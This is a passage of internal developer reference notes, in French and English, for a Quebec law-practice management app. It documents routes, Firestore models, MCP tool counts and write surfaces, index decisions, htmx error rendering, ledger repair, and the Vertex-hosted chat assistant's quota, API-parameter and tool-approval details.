| `/chat/charte` · `/charte/modifier` · `POST /charte` | GET/GET/POST | La CHARTE : détail (+ `?version=` en lecture seule, historique, le SOCLE affiché) / formulaire préremplí de la tête ou de la graine / enregistrement — UNE action, création comprise. Le formulaire poste en **multipart** (voir le Known Gotcha des plafonds). Un refus se rend en 200 avec la saisie repeuplée. Aucune suppression |
| `/chat/competences…` | GET/POST | Skills screens: list / create / detail (+version history, read-only) / edit-as-NEW-version / activate-deactivate. No delete |
| `/chat/taches-planifiees…` | GET/POST | Scheduled-task screens: list / create / edit (effective next occurrence) / activate-deactivate. Closed recurrence vocabulary (3 values, pinned). No delete |
| `/chat/brouillons` · `/brouillons/<id>` | GET | Drafts: grouped list; detail rendering the head (or `?version=` read-only) + provenance-linked version history |
| `/chat/brouillons/<id>/verser-word` | POST | « Verser en Word » — the H.3 pipeline (gabarit `kind="note"`, category shown « Brouillon ») → dossier drafts land in « Projets » (`projet_document_name`), floating drafts download directly |
| `/chat/dossier-search` | GET | The house HTMX autocomplete clone |

### `taches_chat.py` — `/taches/chat/tour` (MACHINE, service « chat » ONLY)

Registered exclusively by `chat/app.py` — the worker process has NO CSRFProtect at all (stricter than exempting; no browser reaches it). Guard: `X-AppEngine-QueueName == "chat-turns"` (exact value) else 403. Outcome→HTTP: `ChatVertexRetryable` (Vertex 429/5xx/timeout, enqueue failure, unreadable conversation) → **503** → queue backoff retry; everything else → **200** consumed (malformed payloads never retry; deterministic failures already terminalized the turn LOUDLY; duplicates observed the advanced state without calling Vertex).

### `taches_chat_cron.py` — `/taches/chat/planification` (MACHINE, cron 15 min, default)

Guard `X-Appengine-Cron == "true"`; CSRF-exempt machine blueprint in main.py. Runs `chat/planification.executer_balayage()`: due-filter in Python over the ACTIVE definitions (no index), the all-in-one dispatch transaction per occurrence, and the repair pass (a marked occurrence whose chain never enqueued, today/yesterday, past the 5-min grace → re-enqueued with its STORED token, `chat_scheduled_repair` at ERROR — every repair must be SEEN).
...
- `count_dossiers_for_partie_strict(partie_id) -> int` (propagates errors — used by FK safety checks; the fail-open display wrapper `count_dossiers_for_partie` was deleted 2026-08-26, its display caller no longer existed), `list_dossiers_for_partie(partie_id) -> list[dict]` — query `client_ids`, `opposing_party_ids` **and `avocat_ids`** (a contact linked as a party's lawyer counts as referenced: it blocks deletion, and `get_partie` reports the dossier with `relation: "avocat"`)
...
- `get_outstanding_total() -> int` (arithmétique revue le 2026-08-18) — Σ **`balance_of`** (le solde VIVANT) sur `status in (envoyée, en_retard)`, en **somme Python bornée**, plus jamais une agrégation Firestore : aucune agrégation ne sait soustraire deux champs, il en faudrait deux, donc un index `(status, amount_due, amount_paid)` qui n'existe pas et dont l'absence rend **0 en silence** — indiscernable de « rien n'est dû ». Sommer `amount_due`, figé à l'émission, surestimait les créances de tout ce qui avait été encaissé. `mcp.handlers.get_billing_snapshot` somme désormais SES PROPRES lignes plutôt que d'appeler cette fonction : le total et le détail ne peuvent plus se contredire dans une seule charge
...
### `models/hearing.py`
- `get_hearing_summary(dossier_id) -> dict`
...
- **Analyse documentaire** (SPEC Phase K §8, août 2026) — `record_analyse(document_id, sortie, *, declenche_par, modele, dossier)` COMPOSE les deux modules PURS (`utils/analyse_taxonomies` pour le vocabulaire fermé, `utils/analyse_protection` pour les dérivations et la règle d'échec vers le haut) — il ne DÉCIDE rien —, écrit le cache `analyse`, **la catégorie DÉRIVÉE** et `category_source: "analyse"`, puis appose au journal write-once. `_analyse_derivee` est sa moitié PURE (aucune écriture, aucune lecture Firestore), ce qui la rend testable sans harnais. `confirmer_analyse(document_id, par)` lève `confirme` sans rien corriger et repasse `category_source` à « juriste ». **`update_analyse(document_id, champs, *, par)`** (2026-08-27) est l'édition par le juriste : les **25 champs** de `ANALYSE_EDITABLE` — soit TOUT ce que `_analyse_derivee` produit, épinglé par dérivation et non par un inventaire écrit à la main —, contrat de présence (clé absente = valeur intacte, clé présente et vide = efface), vocabulaires FERMÉS, nature et famille toujours DÉRIVÉES du code. Deux propriétés portent le lot : c'est le **seul chemin qui peut abaisser** `niveau_protection` (un chemin automatique ne descend jamais), et **éditer vaut confirmer** — le juriste qui corrige a vu la carte, lui redemander un clic serait lui faire dire deux fois la même chose. L'entrée au journal porte `declenche_par: "juriste"`, si bien que l'historique distingue ce que le modèle a proposé de ce que l'avocat a arrêté. `list_analyses(document_id, limit=20)` lit le journal, fail-open. Aucun verbe ne modifie ni n'efface une entrée du journal, et un test le vérifie par balayage.
...
### `models/chat_conversation.py` / `chat_draft.py` / `chat_skill.py` / `chat_scheduled_task.py` (Phase N)

- **`chat_conversation`** — the registre's transactional core: `prepare_conversation`/`prepare_turn_pair` (pure builders — the shapes live ONCE, shared with the scheduled dispatcher), `create_conversation`, `start_turn` (409-in-French while `active_turn_id` is set), `claim_step` → `proceed|skip|repair` (deliberate NON-consumption of the token: a mid-call crash's retry must be able to redo the call; a rotated-but-never-enqueued continuation is repaired), `commit_step` (token re-verified — a lost race discards the loser; terminal commits fold conversation counters + `chat_usage_dossier` + scheduled-task totals into the SAME transaction, all reads before writes, Python sums via `sum_segments`), `fail_turn` (terminalizes regardless of token — the retry-exhaustion path), `decide_authorization` (once, from the pause only), `mark_enqueued` (token-matched only — a stale caller must never disarm the repair), `poser_marqueur_courriel` (the §12.4 at-most-once test-and-set, the poser_accuse shape), `set_skill_selection`, `mark_read`.
- **`chat_draft`** — head + append-only `versions`; `create_draft` (head + v1 in one batch; a caller-supplied id never honoured), `revise_draft` (transactional n+1 + head move; unknown id refuses, NEVER creates), `get_draft`/`get_version`/`list_versions`, `list_drafts` (bounded global + Python filter — no composite). `PROVENANCE` ContextVar, whitelisted keys. **No delete function exists** (pinned).
- **`chat_charter`** — la CHARTE (2026-08-27) : singleton `chat_charter/charte` + `versions/{n:06d}` write-once + `fichiers/{sha256}`. **Verbe unique `revise_charter`**, création implicite DANS la transaction (un `create_charter` séparé laisserait deux onglets frapper la v2 et écraser une version write-once en silence) ; `get_head()` TRI-ÉTAT `(doc, ok|absent|erreur)` — `None` seul confondrait « absent » et « illisible », donc on crierait à chaque déploiement neuf ou on avalerait les vraies pannes ; **`get_version(1)` rend `None`** (`is_source_version`), le texte source étant l'affaire de l'appelant — ce module n'importe JAMAIS `chat/`. Corps vide / < 200 / > plafond **REFUSÉ, jamais tronqué**, et la longueur se mesure sur la valeur BRUTE (sanitize tronque d'abord, nettoie ensuite). Ni `active`, ni delete.
- **`chat_reference_files`** — le dispositif de fichiers partagé par les compétences et la charte (extrait le 2026-08-27 : sha/LF, déduplication par sha, refus jamais troncature). Le client Firestore y est un **paramètre**, jamais un import de module — sinon chaque harnais devrait penser à patcher un second module.
- **`chat_skill`** — same versioned shape; `get_heads` (assembly seam — active only, fails OPEN per skill: a turn degrades to fewer skills, never refuses to run; the recorded versions tell the truth either way); `set_active` is the only lifecycle verb.
- **`chat_scheduled_task`** — closed recurrence vocabulary; `dispatch_occurrence` = the occurrence CAS **and** the whole dispatch (conversation + user turn + assistant turn + marker) in ONE transaction, so a marked occurrence always has its conversation and the repair pass only ever deals with un-ENQUEUED chains; `list_active` (single-field equality + bound; due-filter in Python). Occurrence/usage bookkeeping is never form-writable (`_EDITABLE_FIELDS`). **No delete.**

### MCP (Phase I)

The Phase-I MCP layer added 14 tools; Phase K adds 3 read-only trust tools (17); Phase L adds 2 note-write tools (19); the July 2026 audit remediation adds 3 read tools and 7 create-only writes (29); **the August 2026 mandate adds 3 read tools (`list_invoices`, `get_invoice`, `get_coverage_report`) and `complete_task` (33)**; **lot Q — la reprise de données historiques — adds 3 read tools (`get_reference_vocabulary`, `find_imported`, `get_import_audit`) and 7 writes (`create_partie`, `update_partie`, `create_dossier`, `update_dossier`, `update_time_entry`, `update_expense`, `import_invoice`) — 43 (26 read + 17 write)**; **the August 2026 phase reclassifiers add 4 writes (`set_time_entry_phase`, `set_expense_phase`, and their `_bulk` twins) — 47 (26 read + 21 write)**; **Phase N (le clavardage interne, 2026-08-26) adds 3 read tools (`get_document_text`, `get_draft`, `list_drafts`) and 2 writes (`save_draft`, `revise_draft`) — 52 total (29 read + 23 write), and the SAME handlers are since called IN-PROCESS by `chat/executors.py` (which reproduces the endpoint-side `validate_args` itself — the endpoint's scope/kill-switch/audit layer does NOT run on that path)**. The tool handlers in `mcp/handlers.py` compose **existing** model/util functions only; filters the model layer lacks are applied in the handler over a bounded fetch (≤ 200 docs), and **no composite index exists for an MCP-only query**. **Only the handlers named in `mcp.tools.WRITE_TOOLS` write to Firestore, and the writable surface is exactly: `notes`, `tasks`, `hearings`, `timeentries`, `expenses`, `parties`, `invoices` (create-by-import only, with its `lineitems` subcollection and the `invoiced` flips it causes on the two billing collections), `chat_drafts` (Phase N — with its append-only `versions` subcollection; head + version n+1, never a delete) and `dossiers` — the two append-only arrays (`significations`, `prescription_events`), the fill-only-if-empty fields of `complete_dossier` (« empty » ≡ absent/blank/still equal to the `field_defaults()` default; one conflicting field → atomic French refusal, nothing written), and since lot Q a full create plus a field-by-field correction that REPLACES what it names. A dossier's `status` is settable at CREATION and refused afterwards; party arrays are append-only on the edit path. The `invoiced` wall has exactly ONE opening: `phase`/`sous_phase` on `timeentries`/`expenses`, through `set_*_phase` — a four-key partial `update()` that cannot reach a money figure, every other field of a billed row staying frozen and `update_time_entry`/`update_expense` still refusing one outright** — every other handler stays strictly read-only (notably: `list_protocol_steps` derives overdue status by date comparison instead of calling `check_overdue_steps`, which writes; the trust tools call `models/trust.py` read paths only). Every write runs through `mcp/write_support.run_write` (whose `execute` callable takes NO argument since the `dry_run` preview was retired 2026-08-27): `idempotency_key` stores the result under `mcp_idempotency/{sha256(tool:key)}` for 24 h (TTL fieldOverride + code-enforced expiry; replay returns the stored result with `idempotent_replay: true`; same key + different args → refusal; the cache **fails open** both ways and a refused call records nothing). Note that the *request* path writes outside the tool path regardless (`bearer.stamp_token_last_used`, `oauth.touch_client`, the idempotency records). **Trust tools never emit the bank transit or account number.**
...
requires_precision(code) / avis_delai_display(key)
...
- **Six composite indexes were deleted on sign-off (audit 2026-08-26) after a two-way mapping proved every LIVE query shape indexed** — `invoices(status, amount_due)` (its SUM was deliberately removed; `get_outstanding_total` sums in Python and its docstring names this index), the two single-SUM `timeentries(billable, invoiced, hours)`/`(…, amount)` leftovers (superseded by the merged two-SUM index `(billable, invoiced, amount, hours)`), `trust_transactions(invoice_id, sequence)` (field written, never queried), `trust_transactions(dossier_id, client_id, date, sequence)` (an index ahead of a date-pushdown carte-client that was never written — re-add it WITH that upgrade), and `admin_transactions(account_id, sequence DESC)`. **Its ASC twin `admin_transactions(account_id, sequence ASC)` SURVIVES for one consumer only: `scripts/verify_admin_integrity.py`** — no app query uses it, and ⚠ its presence does NOT mean a sequence-DESC admin read works: an admin mirror of trust's `list_transactions_page`/`_read_last_transaction` would need the DESC index re-created first (the complete-inverse rule below). Seven further indexes are REDUNDANT-BY-PREFIX of their aggregation siblings (the four timeentries and three expenses page shapes) and are kept deliberately — the prefix rule is real, but the cost of being wrong is a silently empty billing list.
...
- **La branche sèche est partie ; la discipline qu'elle imposait au gestionnaire reste.** Le `dry_run` a été **retiré du protocole d'écriture le 2026-08-27** : ce n'était pas un contrôle — aucun schéma ne l'exigeait, rien ne vérifiait qu'un appelant s'en était servi, et un appelant qui l'omettait écrivait — et il doublait chaque écriture en DEUX appels de modèle, ce qui a tué un lot d'analyse documentaire sur `chain_ceiling` après 6 documents sur 45. Le retrait est **fail-closed** : aucun schéma d'entrée ne déclare le paramètre et tous portent `additionalProperties: false`, donc l'envoyer est REFUSÉ, jamais ignoré (`run_write` prend désormais un `execute` SANS argument, et le payload ne porte plus que `idempotent_replay`). Ce qui survit intact : chaque garde du modèle qu'un appelant peut déclencher (une entrée déjà facturée, un nom requis manquant, un id inconnu) reste **répétée dans le gestionnaire**, parce qu'un refus qui NOMME le champ vaut mieux qu'une erreur de modèle nue — la règle ne dépendait pas de l'aperçu, elle le précédait. ⚠ Le paramètre faisait **DEUX métiers sous un seul nom** : « ceci est un aperçu » ET « rien n'a été écrit, donc pas de bump de CTag ». Le second cas est RÉEL — `complete_task` sur une tâche déjà dans l'état demandé n'écrit rien —, d'où `_entity_write_result(wrote=…)`, qui porte cette moitié sous son propre nom : sans elle, retirer l'aperçu aurait mis à bumper un CTag sur un no-op, réveillant DavX5 pour une collection inchangée, en parfait silence.
...
- **L'analyse d'un document ÉCRASE `category`, et trois choses seulement rendent cet écart tenable — les retirer le rouvre.** La SPEC Phase K §5.3 l'interdisait absolument et réservait un geste « adopter la nature »; le praticien a tranché autrement le 2026-08-27, pour que l'enrichissement paraisse à l'explorateur sans second clic. (1) **La catégorie n'est JAMAIS choisie par le modèle** : il fournit une `sous_nature` d'une table FERMÉE et `analyse_taxonomies.nature_of()` en dérive la catégorie — l'outil MCP n'a **aucun paramètre `category`**, et un test l'exige, parce que l'ajouter rouvrirait exactement ce que la garantie protège. (2) **`category_source` porte la provenance**, et c'est elle qui fait paraître la mention « présumé » à l'écran ET dans la sortie MCP — les exigences 2 et 3 de la §7, servies sans le second clic. (3) **Le journal garde `categorie_precedente` ET sa source** : écraser détruit la comparaison à deux valeurs dont vivait `divergence_categorie`, la garder au journal la laisse connaissable. L'avertissement `remplace_un_choix_du_juriste` ne se lève que sur un choix **HUMAIN** — un « autre » posé par défaut au versement du portail n'en mérite pas, sans quoi reprendre un fonds en produirait un par document. ⚠ Corollaire : le niveau de protection **ne redescend jamais** par une réanalyse — mais cette phrase a été FAUSSE du 2026-08-26 au 2026-08-27, et elle l'était partout à la fois. `appliquer_regime` ne monte qu'à l'intérieur d'UN appel : elle ne reçoit rien de l'analyse antérieure, si bien qu'une réanalyse retenant moins de privilèges faisait tomber le niveau — mesuré 3 → 1, en silence, sur un document couvert par le secret professionnel. Pendant ce temps la description de l'outil MCP, la compétence et cette ligne l'affirmaient toutes trois. La règle vit désormais dans `_analyse_derivee`, qui LIT `document["analyse"]["niveau_protection"]`, retient l'UNION des privilèges (garder un niveau sans le privilège qui le fonde produirait une carte que rien n'explique), et lève **`divergence_protection`** en conservant `niveau_protection_analyse` — ce que le passage concluait AVANT le plancher, sans quoi l'écart serait invérifiable. **La voie de descente est le JURISTE**, par `update_analyse` : sans elle la règle serait collante et une sur-protection fautive deviendrait définitive. Leçon générale, et c'est la vraie : une garantie ÉCRITE dans une description d'outil est lue par le modèle comme un fait sur le code, et il en tire des conséquences — ici, moins de raison d'être prudent, exactement à l'envers de la règle asymétrique du domaine.
...
- **htmx 2.0.4 n'échange QUE les réponses 2xx : un fragment d'erreur rendu en 4xx ne paraît JAMAIS.** Son `responseHandling` par défaut est `[{code:"204",swap:false},{code:"[23]..",swap:true},{code:"[45]..",swap:false,error:true}]`. Le dépôt connaît la règle et la contourne au moins une fois (`routes/doc_templates.py:88` rend son fragment en 200 « precisely because a 422 fragment would silently never render »), mais elle ne vivait qu'en commentaire, et un lot neuf a remarché dessus le 2026-08-14 : chaque refus de la suppression de dossier de classement — le plafond « 342 fichiers, au-delà de la limite », l'aveu d'une destruction partielle — mourait à l'écran, bouton mort, rien qui bouge, l'utilisateur re-cliquant. La forme retenue là-bas est la plus simple : **l'échec emprunte la voie du succès** (redirection que le XHR suit, `document_list` rendant alors le fragment `_browser.html` avec `?erreur=` dans sa bannière — le message paraît ET la liste survit), plutôt qu'un fragment qui écraserait la zone d'échange par une seule ligne rouge. **Le balayage « une par une » a été FAIT le 2026-08-26** (audit) — le compte réel était 41 branches `', 422'` + 24 `', 400'`, toutes classées : **25 mortes** (19 gisent dans un `if _is_htmx():` qu'AUCUN appelant htmx n'atteint — l'inventaire complet des `hx-post` du dépôt fait 8 attributs / 7 endpoints, aucun `hx-boost` nulle part — et 4 appartiennent aux endpoints orphelins `move-bulk`/`folder_move` ; 3 sont de vraies gardes de champ caché sur des routes htmx vivantes), **37 correctes** (re-rendus 4xx pleine page ou API JSON dont le `fetch()` lit le statut — 8 sont épinglées par test et doivent RESTER en 4xx), et **3 atteignables qui mouraient en silence, converties le jour même** : `folder_create`/`folder_rename` (un « / » dans le nom, un doublon — redirection 2xx + `?erreur=` dans la bannière de `_browser.html`) et `task_toggle` (« Tâche introuvable. » quand la liste restée ouverte pointe une tâche partie par DavX5/MCP — redirection vers la liste, filtres conservés, bannière ajoutée à `_task_rows.html` ; sa branche non-htmx renvoyait de surcroît un 422 dont le corps entier était le seul `<div>` rouge). Règle inchangée pour la suite : tout NOUVEAU message d'erreur destiné à être lu sort en 2xx, et une garde `_is_htmx()` sur une route sans appelant htmx est du code mort en sursis.
...
- **`ledger_balance` est le SEUL chiffre dénormalisé du registre — quand il diverge, c'est LUI qui a tort** (2026-08-18). Tout le reste se calcule à la lecture (`running_balances`, `opening_ledger_balance`, `book_balance_as_of`), si bien qu'une divergence oppose la carte d'en-tête d'un compte à la dernière ligne de son propre journal. Constaté : 1 154,79 $ sur la carte, 109,68 $ au journal — et c'est le journal qui disait le vrai solde bancaire. **La dérive ne peut venir que d'une écriture hors application** : les trois chemins du modèle (`create`/`update`/`delete_transaction`) ajustent le solde dans la même transaction, et `reverse_transaction` aussi. Le diagnostic se fait par soustraction et il est exact au cent : ici deux encaissements supprimés (1 000,00 $) plus une dépense dont le montant avait été relevé de 16,78 $ à 61,89 $ (45,11 $). **Deux indices trahissent une écriture hors modèle** — une ventilation restée à l'ANCIEN montant (le net que `validate_ventilation` pose sur une ventilation vierge) alors que l'écriture ne porte **aucune révision**, et un trou de séquence sans ligne au journal des suppressions. La réparation est `scripts/reparer_soldes_administration.py`, dont la valeur écrite est CALCULÉE (Σ `admin_delta`, la définition même du contrôle nº 1) et jamais choisie ; il est aveugle au statut comme `admin_delta`, faute de quoi une paire contre-passée créerait un faux écart.
...
- **Chat (Phase N) : le service « chat » tourne sous le SA PAR DÉFAUT, à dessein — le ban d'imports du portail n'est PAS une propriété « second service ».** `client/` ne doit pas importer `models`/`config` parce que son SA à moindre privilège n'a pas les permissions que ces imports exigent (client Firestore par défaut, secrets à l'import). Le worker chat a BESOIN des deux (il appelle les handlers MCP), donc `chat.yaml` n'a pas de ligne `service_account:` et une seule IAM nouvelle existe (`roles/aiplatform.user`). Ne pas « durcir » le service chat vers un SA dédié sans refaire ce raisonnement — la moitié du code cesserait d'importer.
- **Firestore REFUSE un tableau qui contient un tableau — et les deux faux Firestore de la suite l'acceptaient.** Le tout premier vrai tour du clavardage (2026-08-26, avec une compétence cochée) est mort là-dessus : `turn_engine._resolve_skills` écrivait `skill_versions` en `[[skill_id, version], …]`, et `commit_step` répondait `INVALID_ARGUMENT: Nested arrays are not allowed`. Deux propriétés rendent le défaut coûteux : il frappe **au commit**, donc APRÈS l'appel de modèle, déjà payé et perdu ; et il n'est atteignable **que** si une compétence est sélectionnée — le fixture `world` monkeypatche `get_heads → []`, si bien que tous les autres tests écrivaient une liste VIDE, qui est légale. La forme est désormais une liste de **dicts** `{skill_id, version}`. Mais la vraie réparation est ailleurs : **les DEUX harnais** (`tests/test_chat_draft.py`, et sa copie dans `tests/test_chat_turn_engine.py`) modélisent maintenant la contrainte et lèvent, et remettre la forme fautive fait rougir la suite. Un harnais qui accepte ce que le vrai magasin refuse ne prouve rien — et il y en avait **deux** à corriger, ce qui est précisément comment un seul aurait laissé passer la suivante. Deux corollaires vérifiés le même jour : aucun des 52 schémas d'outils MCP n'autorise un `array` d'`array`, donc un argument de modèle ne peut pas rouvrir le trou ; et `ArrayUnion` porte des dicts, jamais des listes.
- **Le quota Vertex des modèles Anthropic est par FAMILLE, pas par version — et il est à ZÉRO sur ce projet.** Le seau s'appelle `anthropic-claude-sonnet` (resp. `-opus`) et couvre Sonnet 4, 4.5, 4.6 **et 5** indifféremment : se rabattre sur une génération antérieure ne contourne donc RIEN, et `us-east5` répond 404 même pour Sonnet 4 (les quotas régionaux non nuls qu'on y voit portent sur des régions qui ne servent pas ce projet). Six demandes d'augmentation ont été refusées en deux secondes, sans revue humaine — signature d'un projet sans historique de dépense, et la situation est circulaire puisque l'usage ne peut pas s'établir à quota nul. **Gemini, lui, est servi — et servi à `northamerica-northeast1`, Montréal** (vérifié en direct 2026-08-26, `gemini-2.5-pro` et `2.5-flash` en 200), ce qui lui fait livrer le bénéfice de résidence que Vertex-Claude n'a jamais pu livrer : pas de transfert hors Québec, donc l'analyse de l'art. 17 Loi 25 devient sans objet sur ce chemin. D'où le **fournisseur et la localisation PAR MODÈLE** (`CHAT_MODELS[*]["provider"]` / `["location"]`, épinglés par test) et le traducteur `chat/gemini.py` — qui convertit dans les DEUX sens pour que `turn_engine` ne change pas d'une ligne. Trois pièges y vivent : un `functionCall` revient avec `finishReason: "STOP"` alors que le moteur attend `tool_use` pour continuer (sans la conversion, **tout tour outillé s'arrêterait après un seul appel**) ; Gemini n'émet aucun id d'appel et apparie par NOM, d'où l'id synthétisé `{nom}#{rang}` — le rang est indispensable, deux appels du même outil dans un tour colleraient sinon leurs résultats ; et `thoughtsTokenCount` se facture en SORTIE, l'omettre sous-estimerait la dépense en silence. Ce qui ne traverse PAS : les signatures de réflexion (donc `includeThoughts: false` — pas de section « Réflexion » sur un tour Gemini, ce qui est vrai plutôt que vide), `pause_turn`, les points d'arrêt de cache, et `web_search` (l'ancrage Google est un autre outil, non câblé).
- **La surface de requête Vertex se vérifie à la référence VIVANTE, jamais de mémoire — et un quota à zéro cache le défaut parfaitement.** Livré le 2026-08-26, `chat/vertex.py` envoyait `thinking: {"type": "enabled", "budget_tokens": N}` et `"temperature": 1`. Les DEUX sont **retirés et répondent 400** sur `claude-sonnet-5`/`claude-opus-5` (comme sur Fable 5, Opus 4.7/4.8) : la forme courante est `{"type": "adaptive"}` pilotée par `output_config.effort`, et **aucun** paramètre d'échantillonnage (`temperature`, `top_p`, `top_k`) n'est accepté. Le clavardage était donc **mort-né**, et rien ne pouvait le montrer : le quota Vertex était à zéro depuis le jour de la livraison, la suite simule le transport, 2 850 tests étaient verts. Réparé le 2026-08-26 même, avec une épingle **négative** (`test_body_carries_no_removed_parameter`) — un commentaire n'aurait rien gardé. Deux corollaires : `thinking.display` vaut désormais `"omitted"` par DÉFAUT, donc le bloc « Réflexion » du transcript rend **vide** si on ne pose pas `"summarized"` explicitement ; et l'ancienne arithmétique de dimensionnement « budget < max_tokens » ne borne plus rien — un penseur adaptatif dépense contre `max_tokens`, et c'est l'**effort** qui est le bouton. Leçon générale : tout ce qu'on ajoute à ce corps se vérifie contre la génération de modèles COURANTE (la compétence `claude-api` est là pour ça), et la sonde `max_tokens: 1` de DEPLOYMENT.md §11b doit porter la forme courante — sinon son 400 se lit à tort comme « Model Garden pas fait ».
- **Chat : la réhydratation des blocs déchargés est BYTE-EXACTE ou le tour meurt — jamais le preview.** Les signatures de thinking et l'`encrypted_content` des résultats web_search doivent revenir identiques au bit près, sinon Vertex refuse la continuation en 400 sans rien dire d'utile. L'assemblage (`turn_engine._rehydrate_block`) télécharge depuis Storage et vérifie le sha256 du pointeur (mismatch → tour `failed` `storage_ref_corrupt`, bruyant) ; le champ `preview` du pointeur ne sert QUE l'affichage. Toute nouvelle surface qui reconstruit des messages (une future compaction v2, un export) doit passer par la même réhydratation.
- **Un outil MCP de LECTURE nouvellement déployé est atteignable par le jeton EN VIGUEUR — aucun kill switch ne le cache.** `MCP_WRITE_ENABLED` ne couvre que `WRITE_TOOLS` ; `MCP_ENABLED` tue tout. Le lot Phase N (qui a ajouté `get_document_text` — le contenu intégral des pièces) l'a payé d'une variante du train d'armement : **révoquer les jetons AVANT le déploiement** (`python -m scripts.revoke_mcp_tokens`), déployer le lot atomique, re-consentir sous le nouvel écran. Fail-closed si le déploiement rate : le connecteur est simplement révoqué. Tout futur élargissement de LECTURE suit ce train, pas celui de `MCP_WRITE_ENABLED`.
- **L'appel in-process d'un handler MCP saute TOUT ce que `endpoint._tools_call` fait.** Validation d'arguments, scope, kill switch, revalidation d'écriture, audit `log_mcp_event` — rien de tout cela ne tourne quand `chat/executors.py` appelle un handler. L'exécuteur refait `tools.validate_args` lui-même (erreurs → tool_result `is_error`, le modèle se corrige), applique son propre kill switch (`CHAT_WRITE_ENABLED`) et émet `chat_tool_call`. Un nouveau garde ajouté CÔTÉ ENDPOINT ne protège PAS le chat — s'il est load-bearing, il va dans le handler ou dans les deux appelants.
- **La table cron compte QUATRE entrées** (réconciliation portail, Bookings, miroir Outlook, répartiteur du clavardage) — le piège REPLACE de `cron.yaml` vaut plus que jamais. Et un TROISIÈME service vit dans trois inventaires codés en dur qui ne se mettent pas à jour seuls : la boucle de prune de `cloudbuild.yaml` (`for SERVICE in default portail chat`), le tuple yaml de `tests/test_security_headers.py` (où `chat.yaml` a un plancher de parse à 1 handler — worker-only, aucun static), et `_SCAN_FILES` de `scripts/check_config.py`.
- **Chat : UNE chaîne par conversation, et `active_turn_id` est le marqueur — maintenu par les MÊMES transactions qui déplacent l'état du tour.** Le 409 du composer le lit ; les commits terminaux le vident ; `fail_turn` (l'épuisement des reprises) le vide aussi. Un chemin qui terminaliserait un tour sans passer par `commit_step`/`fail_turn` laisserait la conversation verrouillée pour toujours. Corollaire de pendule : `est_due` et la passe de réparation du répartiteur jugent TOUT sur l'horloge du BALAYAGE (`_now_mtl()` injecté) — la doctrine de l'horloge gelée ; un `datetime.now()` de plus dans `_reparer` a déjà été attrapé par le harnais gelé le jour de l'écriture.
- **`GATED_TOOLS` a été PEUPLÉ le 2026-08-28** (il était vide en v1 ; cette entrée disait le contraire jusque-là). Il vaut `frozenset(EDIT_TOOLS) | {"import_invoice"}`, soit onze noms dérivés — jamais une liste tenue à la main. ⚠ Ce n'est PAS toute la surface d'écriture : quatorze écritures atteignent le clavardage, donc les dix hors de cet ensemble — `complete_task` (qui complète l'étape de protocole liée et peut clore un protocole entier, sans réouverture d'ici), `create_note`, `append_to_note`, `create_task`, `create_hearing`, `create_time_entry`, `create_expense`, `save_draft`, `record_signification`, `record_prescription_event` — s'exécutent sans rien demander, comme les deux écritures de messagerie (`CHAT_LOCAL_WRITE_TOOLS`, un ensemble SÉPARÉ que celui-ci ne référence pas). Toute prose promettant le contraire est fausse. Le mécanisme d'autorisation (§4.6.3 — pause `awaiting_authorization`, carte Approuver/Refuser, auto-refus en exécution planifiée) est entièrement implémenté et testé ; la politique est au praticien. L'élargir = ajouter un nom dans `chat/registry.py` avec sa raison + mettre à jour le test épinglé — jamais un relâchement silencieux. Avec la parité d'écriture D9 (dérivée de `WRITE_TOOLS`), c'est le SEUL frein structurel entre un run non surveillé et `import_invoice` ; la charte et les clés d'idempotence forcées sont les deux autres.
- **La charte est éditable depuis le 2026-08-27, et trois choses en découlent qui échouent en silence.** (1) **Un corps de charte vide ou blanc brique TOUT le clavardage.** `charter.system_blocks` construit le bloc 0 sans jamais vérifier qu'il est non vide — il ne pouvait pas l'être tant qu'il était une constante ; un bloc texte vide fait répondre **400** à Vertex, que `vertex.py` transforme en fatal et le moteur en tour `failed`, **pour toutes les conversations à la fois**, jusqu'à ré-édition. Trois gardes cumulées : refus à l'écriture (vide / < 200 caractères / > plafond, **jamais tronqué** — `sanitize` couperait en silence, et la longueur se mesure donc sur la valeur BRUTE, avant lui), traitement du corps blanc comme **illisible** par `get_head`, et repli d'assemblage sur le texte source. Le SOCLE rend en outre le bloc 0 non vide par construction. (2) **`charter_version == 1` veut dire TROIS choses** — tour antérieur au lot, amorçage (rien d'enregistré), repli sur erreur de lecture — et **tous les tours déjà au registre portent 1**, si bien qu'un bandeau branché sur ce numéro seul accuserait rétroactivement tout l'historique. C'est `charter_source` qui tranche, vide par défaut pour que l'historique reste muet ; seul « repli » s'allume et journalise (`chat_charter_repli`, ERROR — l'amorçage ne journalise RIEN, crier au loup à chaque installation neuve rendrait l'alerte inutilisable). (3) **Une chaîne née en repli est épinglée à la version SOURCE, qui n'existera jamais dans `versions/`** : une lecture cléée y échouerait POUR TOUJOURS — retryable, redélivrance, retryable — jusqu'à l'épuisement des reprises, donc la mort du tour. D'où le court-circuit `is_source_version`, qui résout la v1 **sans toucher Firestore** ; le retirer casse neuf tests, car toute chaîne multi-pas de la suite naît en amorçage. Corollaire d'ordre : la résolution de la charte vit **AU-DESSUS** du bloc des outils en attente dans `_advance` — c'est la seule partie qui peut lever un retryable, et ce bloc exécute des appels APPROUVÉS sans clé d'idempotence en interactif ; une levée après eux ferait rejouer chaque écriture à la redélivrance. L'ordre est désormais tenu par une dépendance de données autant que par le commentaire.
- **Le texte de repli est DÉRIVÉ du socle, et n'est plus gelé** (2026-08-27, seconde décision du praticien). `BASE_CHARTER` était un littéral figé par sha, pour que « `charter_version: 1` » identifie des octets fixes ; il vaut désormais `SOCLE + SEED_CORPS`. Le motif : un repli qui sert un texte périmé — ancien registre, anciennes règles — dégrade en silence sur le FOND, pas seulement sur le numéro, et c'est précisément quand la charte enregistrée est illisible qu'on veut le texte le plus proche d'elle. Le prix a été **mesuré avant d'être payé** : quatre tours du registre portent 1, tous antérieurs au lot. Ce qui reste vrai de « 1 » : c'est le texte source du commit déployé, résoluble par git, pas par un hachage. **Un seul chemin de jointure** en découle — il y en avait deux tant qu'il fallait protéger des octets gelés. Au lot de scission, `SOCLE ∪ SEED_CORPS` portait exactement les lignes de `BASE_CHARTER` — un test l'exigeait, pour prouver que la coupe ne changeait aucune règle. **Cette égalité a été RETIRÉE le même jour** : le socle a commencé à évoluer pour son compte (vouvoiement, style de réponse), ce qui est exactement ce à quoi sert un texte sous revue de code et ce qu'une égalité figée aurait interdit. Ce qui reste épinglé est ce pour quoi le socle existe : non vide, ses deux sections déontologiques présentes **avec leur compte de règles** (une sous-chaîne survit à la suppression d'une puce sur deux), les identifiants d'outils cités, et un registre unique — vouvoiement partout, là où `BASE_CHARTER`, gelé, reste au tutoiement.
